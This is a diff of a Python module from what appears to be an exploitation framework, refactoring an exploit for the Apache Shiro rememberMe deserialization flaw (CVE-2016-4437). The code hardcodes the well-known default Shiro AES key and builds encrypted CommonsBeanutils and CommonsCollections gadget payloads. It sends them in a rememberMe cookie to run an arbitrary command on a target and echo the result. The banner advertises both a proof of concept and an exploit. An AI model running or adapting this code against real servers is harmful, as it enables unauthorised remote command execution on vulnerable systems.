@@ -1,18 +1,18 @@
-import CodeTest
 import base64,uuid,requests,re
+from ClassCongregation import PocType_,verify
 from Crypto.Cipher import AES
 from operator import methodcaller
-#from ClassCongregation import _urlparse
 from requests_toolbelt.utils import dump
 ################
 ##--ApacheShiro--##
 #cve_2016_4437 反序列化命令执行(可回显)
 ################
 #命令执行修改参数
-SHIRO_KEY = '1QWLxg+NYmxraMoxAXu/Iw=='
+SHIRO_KEY = 'kPH+bIxk5D2deZiIxcaaaA=='
 SHIRO_GADGET = 'CommonsBeanutils1'
-VULN = ''
-TIMEOUT = ''
+CMD = verify.CMD
+VULN = verify.VULN
+TIMEOUT = verify.TIMEOUT
 class ApacheShiro():
     def __init__(self, url, CMD):
         self.url = url
@@ -572,7 +572,6 @@ class ApacheShiro():
             "KCJ3cml0ZSIsIG5ldyBDbGFzc1tde1N0cmluZy5jbGFzc30pLmludm9rZShvYmosIG5ldyBPYmpl"
             "Y3RbXXsiIn0pOw==")
         
-        
     #检测是否存在漏洞
     def cve_2016_4437(self):
         self.pocname = "Apache Shiro: CVE-2016-4437"
@@ -613,19 +612,19 @@ class ApacheShiro():
                             self.Gadget = "CommonsCollectionsK1"
                         if r"VuLnEcHoPoCSuCCeSS" in self.request.text:
                             self.r = "PoCSuCCeSS"
-                            self.info = CodeTest.Colored_.rce() + " [key: " + self.key + " ] [gadget: " + self.Gadget + " ]"
+                            self.info = PocType_.rce() + " [key: " + self.key + " ] [gadget: " + self.Gadget + " ]"
                             #if '\r\n<!DOCTYPE' in self.request.text:
                             #    searchobj = re.search(r'(.*)\r\n<!DOCTYPE(.*)', self.request.text) #返回第一个匹配对象
                             #    text = searchobj.group(1)
-                            #    CodeTest.verify.generic_output(text, self.pocname, self.method, self.rawdata, self.info)
+                            #    verify.generic_output(text, self.pocname, self.method, self.rawdata, self.info)
                             #else:
-                            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+                            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
                             break
                     else:
                         continue
                     break
                 if self.r != "PoCSuCCeSS":
-                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
             else:
                 self.key = SHIRO_KEY
                 self.gadget = SHIRO_GADGET
@@ -645,23 +644,23 @@ class ApacheShiro():
                 self.request = requests.get(self.url, headers=self.headers, cookies={'rememberMe':base64_ciphertext}, 
                                             timeout=TIMEOUT, verify=False)
                 if '<!DOCTYPE' in self.request.text:
-                    text = self.request.text[:self.request.text.find('<!DOCTYPE')]
+                    text = self.request.text[:self.request.text.find('<!DOCTYPE')].strip()
                     #searchobj = re.search(r'(.*)\n<!DOCTYPE(.*)', self.request.text) #返回第一个匹配对象
                     #text = searchobj.group(1)
-                    CodeTest.verify.generic_output(text, self.pocname, self.method, self.rawdata, self.info)
+                    verify.generic_output(text, self.pocname, self.method, self.rawdata, self.info)
                 #elif '\r\n<!DOCTYPE' in self.request.text:
                     #text = self.request.text[:self.request.text.find('\r\n<!DOCTYPE')]
                     #searchobj = re.search(r'(.*)\r\n<!DOCTYPE(.*)', self.request.text) #返回第一个匹配对象
                     #text = searchobj.group(1)
-                #    CodeTest.verify.generic_output(text, self.pocname, self.method, self.rawdata, self.info)
+                #    verify.generic_output(text, self.pocname, self.method, self.rawdata, self.info)
                 else:
-                    CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+                    verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 print("""
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+
 | Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
@@ -669,15 +668,7 @@ print("""
 | Apache Shiro      | cve_2016_4437    |  Y  |  Y  | <= 1.2.4, shiro-550, rememberme deserialization rce         |
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
 def check(**kwargs):
-    global VULN,TIMEOUT
-    VULN = kwargs['vuln']
-    TIMEOUT = int(kwargs['timeout'])
-    CodeTest.Verification.CMD = kwargs['cmd']
-    CodeTest.Verification.VULN = kwargs['vuln']
-    if VULN == 'False':
-        ExpApacheShiro = ApacheShiro(kwargs['url'],"echo VuLnEcHoPoCSuCCeSS")
-    else:
-        ExpApacheShiro = ApacheShiro(kwargs['url'],kwargs['cmd'])
+    ExpApacheShiro = ApacheShiro(kwargs['url'],CMD)
     if kwargs['pocname'] != 'ALL':
         func = getattr(ExpApacheShiro, kwargs['pocname'])#返回对象函数属性值，可以直接调用
         func()#调用函数
@@ -685,6 +676,10 @@ def check(**kwargs):
         for func in dir(ApacheShiro):
             if not func.startswith("__"):
                 methodcaller(func)(ExpApacheShiro)
+
+
+
+
 
 
 
